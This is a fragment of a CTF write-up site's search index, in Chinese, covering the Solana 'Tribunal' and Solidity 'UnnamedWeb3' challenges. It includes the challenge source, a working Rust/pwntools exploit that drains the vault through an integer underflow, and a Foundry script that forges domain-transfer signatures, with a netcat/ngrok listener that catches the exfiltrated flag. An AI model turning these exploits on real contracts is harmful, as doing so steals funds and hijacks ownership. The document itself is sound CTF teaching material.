}, Propose { proposal_id : u8 , proposal_bump : u8 }, Vote { proposal_id : u8 , amount : u64 }, Withdraw { amount : u64 }, } \u7a0b\u5e8f\u53ea\u68c0\u67e5\u7528\u6237\u63d0\u4f9b\u7684 vault \u8d26\u6237\u662f\u5426\u662f Vault \u7c7b\u578b\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528 admin \u521b\u5efa\u7684 vault 1 2 3 if vault_data . discriminator != Types :: Vault { return Err ( ProgramError :: InvalidAccountData ); } \u7531\u4e8e\u7a0b\u5e8f\u4f1a\u68c0\u67e5 config \u8d26\u6237\u7684 admin\uff0c\u56e0\u6b64 config \u8d26\u6237\u53ea\u80fd\u4f7f\u7528\u7528\u6237\u901a\u8fc7 Initialize \u521b\u5efa\u7684\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u4fee\u6539 total_balance \uff0c\u800c total_balance \u53ea\u80fd\u901a\u8fc7 Vote \u4fee\u6539 \u6ce8\u610f\u5230\u5728\u66f4\u65b0 total_balance \u65f6\uff0c -100 \u6ca1\u6709\u4f7f\u7528 checked_sub \uff0c\u56e0\u800c\u53ef\u901a\u8fc7\u4e0b\u6ea2\u51fa\u5f97\u5230\u5145\u8db3\u7684 total_balance 1 2 // update the config total balance config_data . total_balance = config_data . total_balance . checked_add ( lamports ). unwrap () - 100 ; // keep some for rent","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/tribunal/#exploitation","text":"1 2 3 4 5 $ cargo new solve $ cd solve/ $ mv src/main.rs src/lib.rs $ cargo add solana_program borsh $ cargo-build-bpf Cargo.toml 1 2 3 4 5 6 7 8 9 10 11 [package] name = \"solve\" version = \"0.1.0\" edition = \"2021\" [dependencies] borsh = \"0.10.3\" solana-program = \"1.16.5\" [lib] crate-type = [\"cdylib\", \"rlib\"] lib.rs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 use borsh ::{ BorshSerialize }; use solana_program ::{ account_info ::{ next_account_info , AccountInfo }, instruction ::{ AccountMeta , Instruction }, entrypoint :: ProgramResult , entrypoint , program :: invoke , pubkey :: Pubkey , system_program , }; #[derive(BorshSerialize)] pub enum TribunalInstruction { Initialize { config_bump : u8 , vault_bump : u8 }, Propose { proposal_id : u8 , proposal_bump : u8 }, Vote { proposal_id : u8 , amount : u64 }, Withdraw { amount : u64 }, } entrypoint ! ( process_instruction ); pub fn process_instruction ( _program_id : & Pubkey , accounts : & [ AccountInfo ], _instruction_data : & [ u8 ], ) -> ProgramResult { let iter = & mut accounts . iter (); let chall_id = next_account_info ( iter ) ? ; let user = next_account_info ( iter ) ? ; let user_config = next_account_info ( iter ) ? ; let user_vault = next_account_info ( iter ) ? ; let proposal = next_account_info ( iter ) ? ; let vault = next_account_info ( iter ) ? ; let config_bump = 252_ u8 ; let vault_bump = 253_ u8 ; invoke ( & Instruction { program_id : * chall_id . key , data : TribunalInstruction :: Initialize { config_bump , vault_bump }. try_to_vec (). unwrap (), accounts : vec ! [ AccountMeta :: new ( * user . key , true ), AccountMeta :: new ( * user_config . key , false ), AccountMeta :: new ( * user_vault . key , false ), AccountMeta :: new_readonly ( system_program :: id (), false ), ] }, & [ user . clone (), user_config . clone (), // all accounts should be provided user_vault . clone (), ] ) ? ; invoke ( & Instruction { program_id : * chall_id . key , data : TribunalInstruction :: Vote { proposal_id : 1 , amount : 1 }. try_to_vec (). unwrap (), accounts : vec ! [ AccountMeta :: new ( * user . key , true ), AccountMeta :: new ( * user_config . key , false ), AccountMeta :: new ( * vault . key , false ), AccountMeta :: new ( * proposal . key , false ), AccountMeta :: new_readonly ( system_program :: id (), false ), ] }, & [ user . clone (), vault . clone (), user_config . clone (), proposal . clone (), ] ) ? ; invoke ( & Instruction { program_id : * chall_id . key , data : TribunalInstruction :: Withdraw { amount : 95_000_000_000 }. try_to_vec (). unwrap (), accounts : vec ! [ AccountMeta :: new ( * user . key , true ), AccountMeta :: new ( * user_config . key , false ), AccountMeta :: new ( * vault . key , false ), AccountMeta :: new_readonly ( system_program :: id (), false ), ] }, & [ user . clone (), vault . clone (), user_config . clone (), ] ) ? ; Ok (()) } solve.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 from pwn import * from solana.publickey import PublicKey from solana.system_program import SYS_PROGRAM_ID account_metas = [ ( \"program\" , \"-r\" ), # readonly ( \"user\" , \"sw\" ), # signer + writable ( \"user_config\" , \"-w\" ), ( \"user_vault\" , \"-w\" ), ( \"proposal\" , \"-w\" ), ( \"vault\" , \"-w\" ), ( \"system program\" , \"-r\" ), ] instruction_data = b \"\" p = remote ( \"be.ax\" , 30555 ) with open ( \"solve/target/deploy/solve.so\" , \"rb\" ) as f : solve = f . read () p . sendlineafter ( b \"program pubkey: \\n \" , str ( PublicKey ( b '1' * 32 )) . encode ()) p . sendlineafter ( b \"program len: \\n \" , str ( len ( solve )) . encode ()) p . send ( solve ) accounts = {} accounts [ \"program\" ] = p . recvline_contains ( b \"program: \" ) . strip () . split ( b \": \" )[ - 1 ] . decode () accounts [ \"user\" ] = p . recvline_contains ( b \"user: \" ) . strip () . split ( b \": \" )[ - 1 ] . decode () accounts [ \"system program\" ] = SYS_PROGRAM_ID . to_base58 () . decode () program_id = PublicKey ( accounts [ \"program\" ]) config_addr = PublicKey . create_program_address ([ b \"CONFIG\" , b ' \\xfc ' ], program_id ) # use a different bump seed from admin accounts [ \"user_config\" ] = config_addr . to_base58 () . decode () vault_addr = PublicKey . create_program_address ([ b \"VAULT\" , b ' \\xfd ' ], program_id ) accounts [ \"user_vault\" ] = vault_addr . to_base58 () . decode () vault_addr , vault_bump = PublicKey . find_program_address ([ b \"VAULT\" ], program_id ) accounts [ \"vault\" ] = vault_addr . to_base58 () . decode () # admin vault proposal_addr , proposal_bump = PublicKey . find_program_address ([ b \"PROPOSAL\" , b \" \\x01 \" ], program_id ) accounts [ \"proposal\" ] = proposal_addr . to_base58 () . decode () p . recvuntil ( b \"num accounts: \\n \" , drop = True ) p . sendline ( str ( len ( account_metas )) . encode ()) for ( name , perms ) in account_metas : p . sendline ( f \" { perms } { accounts [ name ] } \" . encode ()) p . sendlineafter ( b \"ix len: \\n \" , str ( len ( instruction_data )) . encode ()) p . send ( instruction_data ) p . interactive ()","title":"Exploitation"},{"location":"blockchain/tribunal/#flag","text":"corctf{its_y0ur_time_to_f4ce_the_CoR_tribunal}","title":"Flag"},{"location":"blockchain/tribunal/#_3","text":"anchor - how to convert pubkey to accountinfo? - Solana Stack Exchange Pubkey \u2014 solders documentation","title":"\u53c2\u8003\u8d44\u6599"},{"location":"blockchain/unnamedweb3/","tags":["smart contract","web"],"text":"#smart contract #web .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 Introducing UnnamedWeb3 - now fortified with Smart Contract technology and Blockchain for robust, decentralized DNS security. https://unnamed.insomnihack.ch Challenge.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 // SPDX-License-Identifier: UNLICENSED pragma solidity 0.8.19 ; contract DomainRegistry { struct DomainDetails { address owner ; string ip ; } mapping ( string => DomainDetails ) domains ; address signer ; event DomainRegistered ( string domain , address owner , string ip ); event DomainTransfered ( string domain , address owner , string ip ); event TransferInitiated ( string domain , address destination ); event IpUpdated ( string domain , string newIp ); constructor ( address _signer ) { signer = _signer ; } function registerInsoDomain ( string memory domain , string memory ip ) public payable { require ( msg . value == 1 ether , \"Registration fee is 1 ETH\" ); domain = string . concat ( domain , \".inso\" ); require ( domains [ domain ]. owner == address ( 0 ), \"Domain already registered\" ); DomainDetails memory newDomain = DomainDetails ({ owner : msg . sender , ip : ip }); domains [ domain ] = newDomain ; emit DomainRegistered ( domain , msg . sender , ip ); } function verify ( string memory domain , address owner , bytes memory signature ) private view returns ( bool ) { domain = string ( abi . encodePacked ( domain , \".\" )); uint8 partCount = 0 ; for ( uint i = 0 ; i < bytes ( domain ). length ; i ++ ) { if ( bytes ( domain )[ i ] == \".\" ) { partCount ++ ; require ( partCount <= 64 , \"too many dots\" ); } } bytes32 [] memory parts = new bytes32 []( partCount ); uint8 partIndex = 0 ; string memory part ; for ( uint i = 0 ; i < bytes ( domain ). length ; i ++ ) { if ( bytes ( domain )[ i ] == \".\" ) { part = string ( abi . encodePacked ( part , partCount - partIndex )); bytes32 tmp ; assembly { tmp := mload ( add ( part , 32 )) } parts [ partIndex ] = tmp ; partIndex ++ ; part = \"\" ; } else { part = string ( abi . encodePacked ( part , bytes ( domain )[ i ])); } } for ( uint i = 0 ; i < partCount ; i ++ ) { bytes32 r ; bytes32 s ; uint8 v = uint8 ( signature [ i * 65 + 64 ]); assembly { r := mload ( add ( signature , add ( 32 , mul ( i , 65 )))) s := mload ( add ( signature , add ( 64 , mul ( i , 65 )))) } bytes32 hash = keccak256 ( abi . encodePacked ( parts [ i ], owner )); require ( ecrecover ( hash , v , r , s ) == signer , \"Invalid signature\" ); } return true ; } function initiateTransfer ( string memory domain , address destination ) public { require ( domains [ domain ]. owner == msg . sender , \"Transfer must be initiated by owner\" ); emit TransferInitiated ( domain , destination ); } function transferDomain ( string memory domain , string memory ip , bytes memory transferCode ) public { if ( ! verify ( domain , msg . sender , transferCode )) { revert ( \"Invalid transfer code\" ); } DomainDetails memory newDomain = DomainDetails ({ owner : msg . sender , ip : ip }); domains [ domain ] = newDomain ; emit DomainTransfered ( domain , msg . sender , ip ); } function getDomainOwner ( string memory domain ) public view returns ( address ) { return domains [ domain ]. owner ; } function updateIp ( string memory domain , string memory newIp ) public { require ( domains [ domain ]. owner == msg . sender , \"Only owner can update IP\" ); domains [ domain ]. ip = newIp ; emit IpUpdated ( domain , newIp ); } function resolveIp ( string memory domain ) public view returns ( string memory ip ) { return domains [ domain ]. ip ; } function withdraw () public { require ( msg . sender == signer , \"Only signer can withdraw\" ); payable ( msg . sender ). transfer ( address ( this ). balance ); } } webserver.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 #!/usr/bin/env python3 from flask import Flask , send_from_directory , render_template , session , request from flask_limiter import Limiter from secrets import token_hex import os import requests import helpers FLAG = os . getenv ( \"FLAG\" , \"INS {fake_flag} \" ) CHALLENGE_DOMAIN = \"insomnihack.flag\" app = Flask ( __name__ ) app . secret_key = os . getenv ( \"FLASK_SECRET_KEY\" ) or token_hex ( 16 ) app . config [ \"SESSION_PERMANENT\" ] = False app . config [ \"SESSION_TYPE\" ] = \"filesystem\" def get_remote_address (): return request . access_route [ 0 ] limiter = Limiter ( get_remote_address , app = app , default_limits = [ \"60 per minute\" , \"10 per second\" ], storage_uri = \"memory://\" ) @app . route ( \"/\" , methods = [ \"GET\" ]) def index (): if \"subdomain\" not in session : session [ \"subdomain\" ] = token_hex ( 8 ) challenge_host = session [ \"subdomain\" ] + \".\" + CHALLENGE_DOMAIN deployed = False rpc = None wallet = None contract = None if \"instance_id\" in session : if helpers . is_instance_running ( session [ \"instance_id\" ]): deployed = True rpc = session [ \"rpc\" ] wallet = session [ \"wallet\" ] contract = session [ \"contract\" ] else : del session [ \"instance_id\" ] del session [ \"rpc\" ] del session [ \"wallet\" ] del session [ \"contract\" ] return render_template ( \"index.html\" , challenge_host = challenge_host , deployed = deployed , rpc = rpc , wallet = wallet , contract = contract , ) @app . route ( \"/static/<path:path>\" , methods = [ \"GET\" ]) def static_file ( path ): return send_from_directory ( \"static\" , path ) @app . route ( \"/domain-query\" , methods = [ \"GET\" ]) def dns_query_get (): domain = request . args . get ( \"domain\" ) if domain is None : return \"Invalid request\" , 400 if \"instance_id\" not in session : return \"Instance not running\" , 400 return helpers . resolve_domain ( session [ \"instance_id\" ], domain ) @app . route ( \"/transfer-codes\" , methods = [ \"GET\" ]) def transfer_codes (): if \"instance_id\" not in session : return \"Invalid session\" , 400 contract = helpers . get_contract ( session [ \"instance_id\" ]) events = contract . events . TransferInitiated () . get_logs ( fromBlock = 0 ) transfer_codes = [] for event in events : domain = event [ \"args\" ][ \"domain\" ] recipient = event [ \"args\" ][ \"destination\" ] code = helpers . generate_transfer_code ( domain , recipient ) transfer_codes . append ({ \"domain\" : domain , \"recipient\" : recipient , \"code\" : code }) return transfer_codes @app . route ( \"/transfer-code/<req_domain>/<req_recipient>\" , methods = [ \"GET\" ]) def transfer_code ( req_domain , req_recipient ): if \"instance_id\" not in session : return \"Invalid session\" , 400 contract = helpers . get_contract ( session [ \"instance_id\" ]) events = contract . events . TransferInitiated () . get_logs ( fromBlock = 0 ) for event in events : domain = event [ \"args\" ][ \"domain\" ] recipient = event [ \"args\" ][ \"destination\" ] if domain == req_domain and recipient . lower () == req_recipient . lower (): return helpers . generate_transfer_code ( domain , recipient ), 200 return \"Transfer not initiated\" , 401 @app . route ( \"/send-flag\" , methods = [ \"POST\" ]) def send_flag (): if \"subdomain\" not in session : return \"Invalid session\" , 400 if \"instance_id\" not in session : return \"Instance not running\" , 400 port = 80 if \"port\" in request . args : try : port = int ( request . args [ \"port\" ]) except : return \"Invalid port\" , 400 if port < 1 or port > 65535 : return \"Invalid port\" , 400 # Resolve the domain by calling the `resolveIp` function of the contract host = helpers . resolve_domain ( session [ \"instance_id\" ], session [ \"subdomain\" ] + \".\" + CHALLENGE_DOMAIN ) if host is None or host == \"\" : return \"No DNS entry for this domain\" , 400 try : requests . post ( f \"http:// { host } : { port } \" , data = FLAG , timeout = 2 ) except Exception as e : return str ( e ) return f \"Flag sent to { host } \" @app . route ( \"/create-instance\" , methods = [ \"POST\" ]) @limiter . limit ( \"2 per minute; 3 per 10 minutes; 4 per 20 minutes\" ) def create (): # Remark: The instance is destroyed after 20 minutes instance = helpers . create_instance () if instance [ \"status\" ] == \"success\" : session [ \"instance_id\" ] = instance [ \"instance_id\" ] session [ \"rpc\" ] = instance [ \"rpc\" ] session [ \"wallet\" ] = instance [ \"wallet\" ] session [ \"contract\" ] = instance [ \"contract\" ] return instance @app . route ( \"/stop-instance\" , methods = [ \"POST\" ]) def stop (): if \"instance_id\" in session : helpers . stop_instance ( session [ \"instance_id\" ]) del session [ \"instance_id\" ] del session [ \"rpc\" ] del session [ \"wallet\" ] del session [ \"contract\" ] return { \"status\" : \"success\" , \"message\" : \"Instance stopped\" } else : return { \"status\" : \"failed\" , \"message\" : \"No instance running\" } if __name__ == \"__main__\" : app . run ( debug = True ) \u89e3\u9898\u601d\u8def \u00b6 DomainRegistry \u8bb0\u5f55\u57df\u540d\u5230 IP \u7684\u6620\u5c04\u53ca\u57df\u540d\u6240\u6709\u8005\uff0c\u5e76\u5141\u8bb8\u7528\u6237\u6ce8\u518c\u57df\u540d\u3001\u8f6c\u79fb\u57df\u540d\u6240\u6709\u6743 \u4e3a\u83b7\u53d6 Flag\uff0c\u9700\u8981\u5c06\u7279\u5b9a\u57df\u540d <instance_id>.insomnihack.flag \u6620\u5c04\u5230\u53d7\u63a7 IP \u5730\u5740\uff0c\u800c\u901a\u8fc7 registerInsoDomain() \u53ea\u80fd\u6ce8\u518c\u4ee5 .inso \u7ed3\u5c3e\u7684\u57df\u540d 1 2 3 4 5 6 7 8 # Resolve the domain by calling the `resolveIp` function of the contract host = helpers . resolve_domain ( session [ \"instance_id\" ], session [ \"subdomain\" ] + \".\" + CHALLENGE_DOMAIN ) if host is None or host == \"\" : return \"No DNS entry for this domain\" , 400 try : requests . post ( f \"http:// { host } : { port } \" , data = FLAG , timeout = 2 ) \u5728\u6301\u6709\u670d\u52a1\u5668\u7b7e\u540d\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4f7f\u7528 transferDomain() \u66f4\u65b0\u57df\u540d\u6240\u6709\u8005\u53ca IP \u5730\u5740\u3002\u670d\u52a1\u5668\u7b7e\u540d\u53ef\u5728\u8c03\u7528 initiateTransfer() \u540e\uff0c\u901a\u8fc7 GET /transfer-codes \u83b7\u53d6 \u7b7e\u540d\u9a8c\u8bc1\u5e76\u975e\u9488\u5bf9\u6574\u4e2a\u57df\u540d\uff0c\u800c\u662f\u5206\u6bb5\u8fdb\u884c\u7684\uff0c\u4e3a\u6784\u9020\u63d0\u4f9b\u4e86\u53ef\u80fd\u3002\u5bf9\u4e8e\u6309 . \u5206\u5272\u7684\u57df\u540d\u7684\u5404\u4e2a\u90e8\u5206\uff0c\u9644\u4e0a partCount - partIndex \u7684\u503c\uff0c\u53d6\u524d 32 \u5b57\u8282\u4f5c\u4e3a\u4e00\u6bb5\u8fdb\u884c\u9a8c\u8bc1\u3002\u90a3\u4e48\u53ea\u8981\u6ce8\u518c\u7684\u57df\u540d\u6309 . \u5206\u5272\u7684\u5404\u90e8\u5206\uff08\u9664 .inso \uff09\u81f3\u5c11\u4e3a 32 \u5b57\u8282\uff0c\u5c31\u80fd\u901a\u8fc7 initiateTransfer() \u83b7\u53d6\u4efb\u610f\u7b7e\u540d\uff0c\u518d\u901a\u8fc7 transferDomain() \u8bbe\u7f6e IP \u5730\u5740\u5373\u53ef\u83b7\u53d6 Flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 contract UnnamedWeb3Script is Script { function register () public { vm . startBroadcast ( vm . envUint ( \"PRIVATE_KEY\" )); DomainRegistry registry = DomainRegistry ( vm . envAddress ( \"INSTANCE_ADDR\" )); string memory domain ; string memory part = string ( abi . encodePacked ( \"6b8508d1c6065ac5\" , uint8 ( 3 ))); bytes32 tmp ; assembly { tmp := mload ( add ( part , 32 )) } domain = string ( abi . encodePacked ( domain , tmp )); part = string ( abi . encodePacked ( \"insomnihack\" , uint8 ( 2 ))); assembly { tmp := mload ( add ( part , 32 )) } domain = string ( abi . encodePacked ( domain , \".\" , tmp )); part = string ( abi . encodePacked ( \"flag\" , uint8 ( 1 ))); assembly { tmp := mload ( add ( part , 32 )) } domain = string ( abi . encodePacked ( domain , \".\" , tmp )); registry . registerInsoDomain { value : 1 ether }( domain , \"1.3.3.7\" ); registry . initiateTransfer ( string . concat ( domain , \".inso\" ), vm . addr ( vm . envUint ( \"PRIVATE_KEY\" )) ); vm . stopBroadcast (); } function transfer () public { vm . startBroadcast ( vm . envUint ( \"PRIVATE_KEY\" )); DomainRegistry registry = DomainRegistry ( vm . envAddress ( \"INSTANCE_ADDR\" )); registry . transferDomain ( \"6b8508d1c6065ac5.insomnihack.flag\" , // nc -l -p 8080 // ngrok http 8080 \"<->.ngrok-free.app\" , bytes ( hex \"\" ) // copy the signature from https://unnamed.insomnihack.ch/transfer-codes ); vm . stopBroadcast (); } } Flag \u00b6 INS{H0dl_y0ur_INSO_co1n5_plz!}","title":"UnnamedWeb3"},{"location":"blockchain/unnamedweb3/#_1","text":"Introducing UnnamedWeb3 - now fortified with Smart Contract technology and Blockchain for robust, decentralized DNS security. https://unnamed.insomnihack.ch Challenge.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 // SPDX-License-Identifier: UNLICENSED pragma solidity 0.8.19 ; contract DomainRegistry { struct DomainDetails { address owner ; string ip ; } mapping ( string => DomainDetails ) domains ; address signer ; event DomainRegistered ( string domain , address owner , string ip ); event DomainTransfered ( string domain , address owner , string ip ); event TransferInitiated ( string domain , address destination ); event IpUpdated ( string domain , string newIp ); constructor ( address _signer ) { signer = _signer ; } function registerInsoDomain ( string memory domain , string memory ip ) public payable { require ( msg . value == 1 ether , \"Registration fee is 1 ETH\" ); domain = string . concat ( domain , \".inso\" ); require ( domains [ domain ]. owner == address ( 0 ), \"Domain already registered\" ); DomainDetails memory newDomain = DomainDetails ({ owner : msg . sender , ip : ip }); domains [ domain ] = newDomain ; emit DomainRegistered ( domain , msg . sender , ip ); } function verify ( string memory domain , address owner , bytes memory signature ) private view returns ( bool ) { domain = string ( abi . encodePacked ( domain , \".\" )); uint8 partCount = 0 ; for ( uint i = 0 ; i < bytes ( domain ). length ; i ++ ) { if ( bytes ( domain )[ i ] == \".\" ) { partCount ++ ; require ( partCount <= 64 , \"too many dots\" ); } } bytes32 [] memory parts = new bytes32 []( partCount ); uint8 partIndex = 0 ; string memory part ; for ( uint i = 0 ; i < bytes ( domain ). length ; i ++ ) { if ( bytes ( domain )[ i ] == \".\" ) { part = string ( abi . encodePacked ( part , partCount - partIndex )); bytes32 tmp ; assembly { tmp := mload ( add ( part , 32 )) } parts [ partIndex ] = tmp ; partIndex ++ ; part = \"\" ; } else { part = string ( abi . encodePacked ( part , bytes ( domain )[ i ])); } } for ( uint i = 0 ; i < partCount ; i ++ ) { bytes32 r ; bytes32 s ; uint8 v = uint8 ( signature [ i * 65 + 64 ]); assembly { r := mload ( add ( signature , add ( 32 , mul ( i , 65 )))) s := mload ( add ( signature , add ( 64 , mul ( i , 65 )))) } bytes32 hash = keccak256 ( abi . encodePacked ( parts [ i ], owner )); require ( ecrecover ( hash , v , r , s ) == signer , \"Invalid signature\" ); } return true ; } function initiateTransfer ( string memory domain , address destination ) public { require ( domains [ domain ]. owner == msg . sender , \"Transfer must be initiated by owner\" ); emit TransferInitiated ( domain , destination ); } function transferDomain ( string memory domain , string memory ip , bytes memory transferCode ) public { if ( ! verify ( domain , msg . sender , transferCode )) { revert ( \"Invalid transfer code\" ); } DomainDetails memory newDomain = DomainDetails ({ owner : msg . sender , ip : ip }); domains [ domain ] = newDomain ; emit DomainTransfered ( domain , msg . sender , ip ); } function getDomainOwner ( string memory domain ) public view returns ( address ) { return domains [ domain ]. owner ; } function updateIp ( string memory domain , string memory newIp ) public { require ( domains [ domain ]. owner == msg . sender , \"Only owner can update IP\" ); domains [ domain ]. ip = newIp ; emit IpUpdated ( domain , newIp ); } function resolveIp ( string memory domain ) public view returns ( string memory ip ) { return domains [ domain ]. ip ; } function withdraw () public { require ( msg . sender == signer , \"Only signer can withdraw\" ); payable ( msg . sender ). transfer ( address ( this ). balance ); } } webserver.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 #!/usr/bin/env python3 from flask import Flask , send_from_directory , render_template , session , request from flask_limiter import Limiter from secrets import token_hex import os import requests import helpers FLAG = os . getenv ( \"FLAG\" , \"INS {fake_flag} \" ) CHALLENGE_DOMAIN = \"insomnihack.flag\" app = Flask ( __name__ ) app . secret_key = os . getenv ( \"FLASK_SECRET_KEY\" ) or token_hex ( 16 ) app . config [ \"SESSION_PERMANENT\" ] = False app . config [ \"SESSION_TYPE\" ] = \"filesystem\" def get_remote_address (): return request . access_route [ 0 ] limiter = Limiter ( get_remote_address , app = app , default_limits = [ \"60 per minute\" , \"10 per second\" ], storage_uri = \"memory://\" ) @app . route ( \"/\" , methods = [ \"GET\" ]) def index (): if \"subdomain\" not in session : session [ \"subdomain\" ] = token_hex ( 8 ) challenge_host = session [ \"subdomain\" ] + \".\" + CHALLENGE_DOMAIN deployed = False rpc = None wallet = None contract = None if \"instance_id\" in session : if helpers . is_instance_running ( session [ \"instance_id\" ]): deployed = True rpc = session [ \"rpc\" ] wallet = session [ \"wallet\" ] contract = session [ \"contract\" ] else : del session [ \"instance_id\" ] del session [ \"rpc\" ] del session [ \"wallet\" ] del session [ \"contract\" ] return render_template ( \"index.html\" , challenge_host = challenge_host , deployed = deployed , rpc = rpc , wallet = wallet , contract = contract , ) @app . route ( \"/static/<path:path>\" , methods = [ \"GET\" ]) def static_file ( path ): return send_from_directory ( \"static\" , path ) @app . route ( \"/domain-query\" , methods = [ \"GET\" ]) def dns_query_get (): domain = request . args . get ( \"domain\" ) if domain is None : return \"Invalid request\" , 400 if \"instance_id\" not in session : return \"Instance not running\" , 400 return helpers . resolve_domain ( session [ \"instance_id\" ], domain ) @app . route ( \"/transfer-codes\" , methods = [ \"GET\" ]) def transfer_codes (): if \"instance_id\" not in session : return \"Invalid session\" , 400 contract = helpers . get_contract ( session [ \"instance_id\" ]) events = contract . events . TransferInitiated () . get_logs ( fromBlock = 0 ) transfer_codes = [] for event in events : domain = event [ \"args\" ][ \"domain\" ] recipient = event [ \"args\" ][ \"destination\" ] code = helpers . generate_transfer_code ( domain , recipient ) transfer_codes . append ({ \"domain\" : domain , \"recipient\" : recipient , \"code\" : code }) return transfer_codes @app . route ( \"/transfer-code/<req_domain>/<req_recipient>\" , methods = [ \"GET\" ]) def transfer_code ( req_domain , req_recipient ): if \"instance_id\" not in session : return \"Invalid session\" , 400 contract = helpers . get_contract ( session [ \"instance_id\" ]) events = contract . events . TransferInitiated () . get_logs ( fromBlock = 0 ) for event in events : domain = event [ \"args\" ][ \"domain\" ] recipient = event [ \"args\" ][ \"destination\" ] if domain == req_domain and recipient . lower () == req_recipient . lower (): return helpers . generate_transfer_code ( domain , recipient ), 200 return \"Transfer not initiated\" , 401 @app . route ( \"/send-flag\" , methods = [ \"POST\" ]) def send_flag (): if \"subdomain\" not in session : return \"Invalid session\" , 400 if \"instance_id\" not in session : return \"Instance not running\" , 400 port = 80 if \"port\" in request . args : try : port = int ( request . args [ \"port\" ]) except : return \"Invalid port\" , 400 if port < 1 or port > 65535 : return \"Invalid port\" , 400 # Resolve the domain by calling the `resolveIp` function of the contract host = helpers . resolve_domain ( session [ \"instance_id\" ], session [ \"subdomain\" ] + \".\" + CHALLENGE_DOMAIN ) if host is None or host == \"\" : return \"No DNS entry for this domain\" , 400 try : requests . post ( f \"http:// { host } : { port } \" , data = FLAG , timeout = 2 ) except Exception as e : return str ( e ) return f \"Flag sent to { host } \" @app . route ( \"/create-instance\" , methods = [ \"POST\" ]) @limiter . limit ( \"2 per minute; 3 per 10 minutes; 4 per 20 minutes\" ) def create (): # Remark: The instance is destroyed after 20 minutes instance = helpers . create_instance () if instance [ \"status\" ] == \"success\" : session [ \"instance_id\" ] = instance [ \"instance_id\" ] session [ \"rpc\" ] = instance [ \"rpc\" ] session [ \"wallet\" ] = instance [ \"wallet\" ] session [ \"contract\" ] = instance [ \"contract\" ] return instance @app . route ( \"/stop-instance\" , methods = [ \"POST\" ]) def stop (): if \"instance_id\" in session : helpers . stop_instance ( session [ \"instance_id\" ]) del session [ \"instance_id\" ] del session [ \"rpc\" ] del session [ \"wallet\" ] del session [ \"contract\" ] return { \"status\" : \"success\" , \"message\" : \"Instance stopped\" } else : return { \"status\" : \"failed\" , \"message\" : \"No instance running\" } if __name__ == \"__main__\" : app . run ( debug = True )","title":"\u9898\u76ee"},{"location":"blockchain/unnamedweb3/#_2","text":"DomainRegistry \u8bb0\u5f55\u57df\u540d\u5230 IP \u7684\u6620\u5c04\u53ca\u57df\u540d\u6240\u6709\u8005\uff0c\u5e76\u5141\u8bb8\u7528\u6237\u6ce8\u518c\u57df\u540d\u3001\u8f6c\u79fb\u57df\u540d\u6240\u6709\u6743 \u4e3a\u83b7\u53d6 Flag\uff0c\u9700\u8981\u5c06\u7279\u5b9a\u57df\u540d <instance_id>.insomnihack.flag \u6620\u5c04\u5230\u53d7\u63a7 IP \u5730\u5740\uff0c\u800c\u901a\u8fc7 